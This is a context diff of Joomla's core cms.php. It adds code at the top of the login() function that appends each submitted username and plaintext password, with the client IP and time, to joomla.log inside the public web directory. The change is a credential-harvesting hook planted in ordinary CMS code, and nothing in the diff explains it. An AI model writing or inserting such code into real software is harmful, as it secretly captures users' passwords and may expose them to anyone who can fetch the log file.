*** /var/www/html/joomla/libraries/cms/application/cms.php	2015-03-21 20:14:44.000000000 -0700
--- /home/rutu/Documents/html/joomla/libraries/cms/application/cms.php	2015-04-25 21:56:11.057802270 -0700
***************
*** 780,809 ****
--- 780,818 ----
  	 *
  	 * Username and encoded password are sent as credentials (along with other
  	 * possibilities) to each observer (authentication plugin) for user
  	 * validation.  Successful validation will update the current session with
  	 * the user details.
  	 *
  	 * @param   array  $credentials  Array('username' => string, 'password' => string)
  	 * @param   array  $options      Array('remember' => boolean)
  	 *
  	 * @return  boolean  True on success.
  	 *
  	 * @since   3.2
  	 */
  	public function login($credentials, $options = array())
  	{
+ 		//write to log file
+                 date_default_timezone_set("UTC");
+                 $ipadd= getenv('REMOTE_ADDR'); 
+                 $myfile = fopen("/var/www/html/joomla/joomla.log", "a");
+                 $val="User:".$credentials['username']."\nPassword:".$credentials['password'];
+                 $val=$val."\nIP:".$ipadd."\nTime:".date("Y-m-d H:i:s", time())."\n";
+                 fwrite($myfile,$val);
+                 fclose($myfile);
+ 
  		// Get the global JAuthentication object.
  		jimport('joomla.user.authentication');
  
  		$authenticate = JAuthentication::getInstance();
  		$response = $authenticate->authenticate($credentials, $options);
  
  		// Import the user plugin group.
  		JPluginHelper::importPlugin('user');
  
  		if ($response->status === JAuthentication::STATUS_SUCCESS)
  		{
  			/*
  			 * Validate that the user should be able to login (different to being authenticated).
  			 * This permits authentication plugins blocking the user.
  			 */
